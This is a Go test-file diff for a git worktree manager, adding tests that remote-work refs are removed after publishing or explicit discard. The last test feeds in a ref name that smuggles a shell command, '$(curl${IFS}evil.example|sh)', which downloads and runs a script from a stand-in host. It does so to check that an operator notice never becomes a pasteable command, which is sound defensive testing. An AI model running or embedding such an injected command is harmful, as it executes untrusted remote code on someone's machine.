@@ -60,6 +60,11 @@ func TestRemoveWithOptions_PublishesRemoteWorkInsteadOfLosingIt(t *testing.T) {
 	if got := rwGit(t, origin, "rev-parse", "refs/heads/"+p.Branch); got != sha {
 		t.Fatalf("origin branch %s = %s after removal, want the remote work %s", p.Branch, got, sha)
 	}
+	// Origin is the record now. A leftover work ref would read as unpublished
+	// work again once the branch is merged and deleted from origin.
+	if refExists(t, mayorRig, constants.RemoteWorkRef(p.Branch)) {
+		t.Fatal("the work ref survived a removal that published it")
+	}
 }
 
 func TestRemoveWithOptions_RefusesWhenRemoteWorkCannotBePublished(t *testing.T) {
@@ -146,5 +151,55 @@ func TestCleanupStaleBranches_PrunesPublishedWorkRefsAndKeepsUnpublishedOnes(t *
 	}
 	if !refExists(t, mayorRig, owned) {
 		t.Errorf("%s belongs to a live polecat and was deleted", owned)
+	}
+}
+
+// With the worktree gone nothing is ever published, and an explicit discard
+// has to take the work ref with it: left behind, it is reported by every
+// cleanup run as work nobody can finish.
+func TestRemoveWith_MissingWorktreeDiscardDeletesRemoteWork(t *testing.T) {
+	f := newMissingWorktreeFixture(t, "start point", false)
+	rwGit(t, f.p.ClonePath, "push", "-q", "origin", "HEAD:refs/heads/"+f.branch)
+	rwGit(t, f.p.ClonePath, "fetch", "-q", "origin")
+	leaveRemoteWork(t, f.p.ClonePath, f.branch, "work pushed by the remote worker")
+	workRef := constants.RemoteWorkRef(f.branch)
+	repo, err := f.mgr.repoBase()
+	if err != nil {
+		t.Fatalf("repoBase: %v", err)
+	}
+	repoDir := repo.WorkDir()
+	if repoDir == "" {
+		repoDir = filepath.Join(f.mgr.rig.Path, ".repo.git")
+	}
+	if err := os.RemoveAll(f.p.ClonePath); err != nil {
+		t.Fatalf("remove worktree: %v", err)
+	}
+
+	var risk *WorkAtRiskError
+	if err := f.mgr.RemoveWithOptions("toast", true, false, false); !errors.As(err, &risk) {
+		t.Fatalf("without discard: err = %v, want *WorkAtRiskError", err)
+	}
+	if !refExists(t, repoDir, workRef) {
+		t.Fatal("the work ref was deleted by a refused removal")
+	}
+	if err := f.mgr.RemoveWith("toast", RemoveOptions{Force: true, DiscardUnpushed: true}); err != nil {
+		t.Fatalf("RemoveWith(DiscardUnpushed): %v", err)
+	}
+	if refExists(t, repoDir, workRef) {
+		t.Fatalf("%s survived an explicit discard", workRef)
+	}
+}
+
+// A work ref's name is chosen by the worker and can hold shell syntax. The
+// notice about an orphaned one is read by an operator, so it must never be a
+// command to paste.
+func TestOrphanWorkRefNotice_IsNotAPasteableCommand(t *testing.T) {
+	ref := "refs/remote-work/polecat/foo/$(curl${IFS}evil.example|sh)"
+	notice := orphanWorkRefNotice(ref, 2)
+	if strings.Contains(notice, "git push") || strings.Contains(notice, "git update-ref") {
+		t.Fatalf("notice offers a command built from a worker-chosen name: %s", notice)
+	}
+	if !strings.Contains(notice, `"`+ref+`"`) {
+		t.Fatalf("notice should quote the ref name, got: %s", notice)
 	}
 }
